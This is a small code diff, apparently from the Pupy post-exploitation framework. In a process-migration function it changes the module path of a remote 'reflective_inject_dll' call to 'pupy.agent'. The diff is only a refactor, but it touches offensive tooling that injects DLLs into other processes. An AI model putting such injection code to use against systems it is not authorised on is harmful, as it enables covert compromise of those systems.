@@ -134,7 +134,7 @@ def migrate(
     )
 
     reflective_inject_dll = module.client.remote(
-        'pupy', 'reflective_inject_dll', False
+        'pupy.agent', 'reflective_inject_dll', False
     )
 
     reflective_inject_dll(
